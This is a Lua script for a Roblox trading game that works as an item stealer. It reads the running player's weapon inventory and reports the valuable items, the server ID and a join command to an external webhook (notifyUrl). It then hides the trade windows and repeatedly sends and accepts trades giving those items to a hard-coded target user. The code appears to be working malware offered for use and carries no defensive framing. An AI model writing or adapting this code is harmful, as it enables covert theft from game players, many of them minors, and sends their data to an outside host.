local function getTradeStatus()
    return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
end

local function sendTradeRequest(target)
    TradeRemote.SendRequest:InvokeServer(Players:WaitForChild(target))
end

local function offerItem(itemId)
    TradeRemote.OfferItem:FireServer(itemId, "Weapons")
end

local function acceptTrade()
    TradeRemote.AcceptTrade:FireServer(285646582)
end

local function getInventory()
    local data = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
    local items = {}
    for itemId, amount in pairs(data.Weapons.Owned) do
        local itemInfo = ItemData[itemId]
        if itemInfo and itemInfo.Rarity then
            local rarityIndex = table.find(rarityOrder, itemInfo.Rarity)
            if rarityIndex and rarityIndex >= minRarityIndex then
                local value = valueTable[itemId] or (rarityIndex > 5 and 2 or 1)
                if value >= valueThreshold and not excludedItems[itemId] then
                    table.insert(items, {
                        id = itemId,
                        name = itemInfo.ItemName or itemId,
                        amount = amount,
                        rarity = itemInfo.Rarity,
                        value = value,
                        chroma = itemInfo.Chroma or false
                    })
                end
            end
        end
    end
    table.sort(items, function(a,b) return a.value * a.amount > b.value * b.amount end)
    return items
end

local function notify(items, totalValue)
    local itemList = ""
    for _, item in ipairs(items) do
        itemList = itemList .. string.format("%s (x%d): %d value\n", item.name, item.amount, item.value * item.amount)
        if #itemList > 800 then
            itemList = itemList .. "+ more..."
            break
        end
    end
    
    local payload = {
        content = "Server: `" .. game.JobId .. "`",
        embeds = {{
            title = "Trade Session Initiated",
            color = 3447003,
            fields = {
                {name = "User", value = LocalPlayer.Name, inline = true},
                {name = "Recipient", value = targetUser, inline = true},
                {name = "Items", value = "```" .. itemList .. "```", inline = false},
                {name = "Total Value", value = tostring(totalValue), inline = true},
                {name = "Join Command", value = "```game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')```", inline = false}
            },
            footer = {text = "Generated Script • " .. os.date("%Y-%m-%d %H:%M:%S")}
        }}
    }
    
    request({
        Url = notifyUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end

local function executeTransfer()
    local inventory = getInventory()
    if #inventory == 0 then
        LocalPlayer:Kick("No eligible items found")
        return
    end
    
    local totalValue = 0
    for _, item in ipairs(inventory) do
        totalValue = totalValue + (item.value * item.amount)
    end
    
    notify(inventory, totalValue)
    
    local tradeGui = LocalPlayer.PlayerGui:WaitForChild("TradeGUI")
    local phoneTradeGui = LocalPlayer.PlayerGui:WaitForChild("TradeGUI_Phone")
    
    tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() tradeGui.Enabled = false end)
    phoneTradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() phoneTradeGui.Enabled = false end)
    
    local processed = {}
    for _, item in ipairs(inventory) do
        processed[item.id] = item
    end
    
    local active = true
    while active and #inventory > 0 do
        local status = getTradeStatus()
        
        if status == "None" then
            sendTradeRequest(targetUser)
        elseif status == "StartTrade" then
            local offered = 0
            while offered < 4 and #inventory > 0 do
                local item = table.remove(inventory, 1)
                for i = 1, item.amount do
                    offerItem(item.id)
                    task.wait(0.1)
                end
                offered = offered + 1
            end
            task.wait(5)
            acceptTrade()
            repeat task.wait(0.5) until getTradeStatus() == "None"
        elseif status == "ReceivingRequest" then
            TradeRemote.DeclineRequest:FireServer()
        end
        
        task.wait(1)
    end
    
    local finalPayload = {
        embeds = {{
            title = "Transfer Complete",
            color = 65280,
            description = "All eligible items processed",
            footer = {text = "Session ended"}
        }}
    }
    
    request({
        Url = notifyUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(finalPayload)
    })
